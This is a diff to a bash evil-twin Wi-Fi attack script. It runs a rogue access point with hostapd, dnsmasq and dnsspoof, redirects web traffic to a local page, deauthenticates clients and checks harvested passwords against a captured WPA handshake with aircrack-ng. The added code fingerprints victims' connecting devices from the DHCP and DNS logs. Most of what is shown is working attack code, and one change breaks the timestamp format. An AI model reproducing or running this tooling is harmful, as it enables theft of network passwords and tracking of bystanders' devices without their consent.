@@ -22,6 +22,37 @@ AP_INTERFACE="wlan2"
 INTERNET_INTERFACE=""
 SELECTED_INTERFACE=""
 
+detect_device() {
+    local hostname="$1"
+    local mac="$2"
+    
+    if [ -n "$hostname" ] && [ "$hostname" != "*" ]; then
+        hostname_lower=$(echo "$hostname" | tr '[:upper:]' '[:lower:]')
+        
+        if echo "$hostname_lower" | grep -q "desktop-\|win-\|pc-\|windows\|laptop\|notebook"; then
+            echo "Windows"
+            return
+        fi
+        
+        if echo "$hostname_lower" | grep -q "iphone\|ipad\|ipod\|macbook\|mac-"; then
+            echo "Apple"
+            return
+        fi
+        
+        if echo "$hostname_lower" | grep -q "android\|galaxy\|sm-"; then
+            echo "Android"
+            return
+        fi
+        
+        if echo "$hostname_lower" | grep -q "linux\|ubuntu\|kali\|raspberry"; then
+            echo "Linux"
+            return
+        fi
+    fi
+    
+    echo "Unknown"
+}
+
 get_monitor_interface() {
     local selected_iface="$SELECTED_INTERFACE"
     
@@ -101,6 +132,13 @@ cleanup() {
     rm -f nohup.out
     rm -f *.pcap
     rm -f attempts.txt password.txt
+    rm -f /tmp/hostapd.log
+    rm -f /tmp/dnsmasq.log
+    rm -f /tmp/shown_connections.txt 
+    rm -f /tmp/shown_disconnections.txt
+    rm -f /tmp/connection_cache.txt
+    rm -f /tmp/dns_shown_macs.txt
+    rm -f /tmp/dhcp_shown.txt
     if [ -n "$HANDSHAKE_FILE" ] && [ -f "$HANDSHAKE_FILE" ]; then
         rm -f "$HANDSHAKE_FILE"
     fi
@@ -432,7 +470,6 @@ setup_internet_sharing() {
     
     ifconfig "$AP_INTERFACE" up 10.0.0.1 netmask 255.255.255.0
     
-    
     iptables -t nat -A PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
     iptables --table nat --append POSTROUTING --out-interface "$INTERNET_INTERFACE" -j MASQUERADE
     iptables --append FORWARD --in-interface "$AP_INTERFACE" -j ACCEPT
@@ -445,9 +482,9 @@ setup_internet_sharing() {
     ip rule add from all iif "$AP_INTERFACE" lookup "$table" pref 21000 2>/dev/null
     
     echo "Starting services..."
-    sleep 5 && hostapd hostapd.conf > /dev/null 2>&1 &
+    sleep 5 && hostapd hostapd.conf 2>&1 | tee /tmp/hostapd.log > /dev/null 2>&1 &
     sleep 5
-    dnsmasq -C dnsmasq.conf > /dev/null 2>&1 &
+    dnsmasq -C dnsmasq.conf --log-dhcp -d > /tmp/dnsmasq.log 2>&1 &
     sleep 5
     dnsspoof -i "$AP_INTERFACE" > /dev/null 2>&1 &
 }
@@ -479,17 +516,28 @@ monitor_attack() {
     echo "Handshake: $HANDSHAKE_FILE"
     echo "Deauth:   $MON_INTERFACE"
     echo "----------------------------------------"
-    echo "Monitoring for credentials..."
+    echo "Monitoring connections & credentials..."
     echo "----------------------------------------"
+    
+    SHOWN_CONNECTIONS="/tmp/shown_connections.txt"
+    SHOWN_DISCONNECTIONS="/tmp/shown_disconnections.txt"
+    DHCP_SHOWN_FILE="/tmp/dhcp_shown.txt"
+    CONNECTION_CACHE="/tmp/connection_cache.txt"
+    DNS_SHOWN_MACS="/tmp/dns_shown_macs.txt"
+    
     last_attempt_count=0
     password_found=false
+    
+    HOSTAPD_LOG_POS=0
+    DNSMASQ_LOG_POS=0
+    
     while true; do
         if [ -f "password.txt" ] && [ -s "password.txt" ]; then
             temp_pass=$(cat password.txt | head -1 | tr -d '[:space:]')
             if aircrack-ng "$HANDSHAKE_FILE" -b "$TARGET_BSSID" -w password.txt 2>/dev/null | grep -q "KEY FOUND"; then
                 echo ""
                 echo -e "${GREEN}PASSWORD CRACKED: $temp_pass${NC}"
-                timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+                timestamp=$(date +"%Y-%m-d %H:%M:%S")
                 echo "$timestamp | SSID: $TARGET_SSID | BSSID: $TARGET_BSSID | Password: $temp_pass" >> cracked.txt
                 echo -e "${GREEN}Cracked Network Saved in: cracked.txt${NC}"
                 echo ""
@@ -505,6 +553,7 @@ monitor_attack() {
                 break
             fi
         fi
+        
         if [ -f "attempts.txt" ] && [ -s "attempts.txt" ]; then
             current_count=$(wc -l < attempts.txt 2>/dev/null)
             if [ $current_count -gt $last_attempt_count ]; then
@@ -522,7 +571,156 @@ monitor_attack() {
                 last_attempt_count=$current_count
             fi
         fi
-        sleep 5
+        
+        if [ -f "/tmp/hostapd.log" ]; then
+            current_size=$(stat -c%s "/tmp/hostapd.log" 2>/dev/null || wc -c < "/tmp/hostapd.log")
+            
+            if [ $current_size -gt $HOSTAPD_LOG_POS ]; then
+                tail -c +$((HOSTAPD_LOG_POS + 1)) "/tmp/hostapd.log" | while IFS= read -r log_line; do
+                    
+                    if echo "$log_line" | grep -q "AP-STA-CONNECTED"; then
+                        mac=$(echo "$log_line" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}')
+                        
+                        if [ -n "$mac" ]; then
+                            if ! grep -q "^$mac$" "$CONNECTION_CACHE" 2>/dev/null; then
+                                echo "$mac" >> "$CONNECTION_CACHE"
+                                
+                                sleep 2
+                                
+                                hostname=""
+                                ip=""
+                                device_type="Unknown"
+                                
+                                if [ -f "/tmp/dnsmasq.log" ]; then
+                                    hostname=$(grep "DHCPACK.*$mac" /tmp/dnsmasq.log 2>/dev/null | tail -1 | awk '{for(i=6;i<=NF;i++) if ($i !~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/) {print $i; break}}')
+                                    
+                                    if [ -z "$hostname" ]; then
+                                        hostname=$(grep "client provides name:.*$mac" /tmp/dnsmasq.log 2>/dev/null | tail -1 | awk '{print $NF}' | sed 's/"//g')
+                                    fi
+                                    
+                                    ip=$(grep -E "DHCPACK.*$mac|DHCPOFFER.*$mac" /tmp/dnsmasq.log 2>/dev/null | tail -1 | awk '{print $4}')
+                                    
+                                    if [ -n "$ip" ]; then
+                                        if grep -q "query.*captive\.apple\.com.*$ip" /tmp/dnsmasq.log 2>/dev/null; then
+                                            device_type="Apple"
+                                        elif grep -q "query.*msftconnecttest\.com.*$ip" /tmp/dnsmasq.log 2>/dev/null; then
+                                            device_type="Windows"
+                                        elif grep -q "query.*connectivitycheck.*$ip" /tmp/dnsmasq.log 2>/dev/null; then
+                                            device_type="Android"
+                                        fi
+                                    fi
+                                fi
+                                
+                                if [ "$device_type" = "Unknown" ] && [ -n "$hostname" ]; then
+                                    device_type=$(detect_device "$hostname" "$mac")
+                                fi
+                                
+                                if [ "$device_type" != "Unknown" ]; then
+                                    if [ -n "$hostname" ] && [ "$hostname" != "*" ]; then
+                                        echo -e "${GREEN}[+]${NC} $device_type connected: $mac ($hostname${ip:+, IP: $ip})"
+                                    elif [ -n "$ip" ]; then
+                                        echo -e "${GREEN}[+]${NC} $device_type connected: $mac (IP: $ip)"
+                                    else
+                                        echo -e "${GREEN}[+]${NC} $device_type connected: $mac"
+                                    fi
+                                else
+                                    echo -e "${YELLOW}[!]${NC} Unknown device connected: $mac${ip:+, IP: $ip}"
+                                fi
+                            fi
+                        fi
+                    fi
+                    
+                    if echo "$log_line" | grep -q "AP-STA-DISCONNECTED"; then
+                        mac=$(echo "$log_line" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}')
+                        
+                        if [ -n "$mac" ]; then
+                            sed -i "/^$mac$/d" "$CONNECTION_CACHE" 2>/dev/null
+                            echo -e "${RED}[-]${NC} Device disconnected: $mac"
+                        fi
+                    fi
+                    
+                done
+                
+                HOSTAPD_LOG_POS=$current_size
+            fi
+        fi
+        
+        if [ -f "/tmp/dnsmasq.log" ]; then
+            current_dns_size=$(stat -c%s "/tmp/dnsmasq.log" 2>/dev/null || wc -c < "/tmp/dnsmasq.log")
+            
+            if [ $current_dns_size -gt $DNSMASQ_LOG_POS ]; then
+                
+                tail -c +$((DNSMASQ_LOG_POS + 1)) "/tmp/dnsmasq.log" | while IFS= read -r dns_line; do
+                    
+                    if echo "$dns_line" | grep -q "vendor class:\|client provides name:"; then
+                        clean_line=$(echo "$dns_line" | sed -n 's/.*\(query\[[^]]*\].*from [0-9.]*\).*/\1/p')
+                        [ -z "$clean_line" ] && clean_line="$dns_line"
+                        line_hash=$(echo "$clean_line" | md5sum | cut -d' ' -f1)
+                        
+                        if ! grep -q "$line_hash" "$DHCP_SHOWN_FILE" 2>/dev/null; then
+                            mac=$(echo "$dns_line" | grep -o -E '([0-9a-f]{2}:){5}[0-9a-f]{2}')
+                            
+                            if [ -n "$mac" ]; then
+                                echo "$line_hash" >> "$DHCP_SHOWN_FILE"
+                                
+                                if echo "$dns_line" | grep -q "vendor class:"; then
+                                    vendor=$(echo "$dns_line" | sed -n 's/.*vendor class: \([^|]*\).*/\1/p')
+                                    if [ -n "$vendor" ]; then
+                                        if echo "$vendor" | grep -qi "MSFT"; then
+                                            echo "[DHCP] Windows device: $mac (Vendor: $vendor)"
+                                        elif echo "$vendor" | grep -qi "android"; then
+                                            echo "[DHCP] Android device: $mac (Vendor: $vendor)"
+                                        fi
+                                    fi
+                                fi
+                                
+                                if echo "$dns_line" | grep -q "client provides name:"; then
+                                    hostname=$(echo "$dns_line" | awk -F'client provides name: ' '{print $2}' | awk '{print $1}')
+                                    if [ -n "$hostname" ]; then
+                                        echo "[DHCP] Hostname provided: $mac → $hostname"
+                                    fi
+                                fi
+                            fi
+                        fi
+                    fi
+                    
+                    if echo "$dns_line" | grep -q "query\[.*captive\.apple\.com\|query\[.*msftconnecttest\.com\|query\[.*connectivitycheck\.android\.com"; then
+                        clean_line=$(echo "$dns_line" | sed -n 's/.*\(query\[[^]]*\].*from [0-9.]*\).*/\1/p')
+                        [ -z "$clean_line" ] && clean_line="$dns_line"
+                        line_hash=$(echo "$clean_line" | md5sum | cut -d' ' -f1)
+                        
+                        if ! grep -q "$line_hash" "$DHCP_SHOWN_FILE" 2>/dev/null; then
+                            ip=$(echo "$clean_line" | grep -o -E 'from [^ ]*' | awk '{print $2}')
+                            
+                            if [ -n "$ip" ]; then
+                                mac=$(arp -n | grep "^$ip " | awk '{print $3}')
+                                
+                                if [ -n "$mac" ]; then
+                                    echo "$line_hash" >> "$DHCP_SHOWN_FILE"
+                                    
+                                    if ! grep -q "^${mac}$" "$DNS_SHOWN_MACS" 2>/dev/null; then
+                                        echo "${mac}" >> "$DNS_SHOWN_MACS"
+                                        
+                                        if echo "$clean_line" | grep -q "captive\.apple\.com"; then
+                                            echo "[DNS] Apple device detected: $mac"
+                                        elif echo "$clean_line" | grep -q "msftconnecttest\.com"; then
+                                            echo "[DNS] Windows device detected: $mac"
+                                        elif echo "$clean_line" | grep -q "connectivitycheck\.android\.com"; then
+                                            echo "[DNS] Android device detected: $mac"
+                                        fi
+                                    fi
+                                fi
+                            fi
+                        fi
+                    fi
+                    
+                done
+                
+                DNSMASQ_LOG_POS=$current_dns_size
+            fi
+        fi
+        
+        sleep 3
     done
 }
 
@@ -571,7 +769,7 @@ main() {
                     ;;
             esac
             exit 1
-        fi
+         fi
     done
     if python3 -c "import flask" 2>/dev/null; then
         echo -e "  ${GREEN}[✓]${NC} flask"
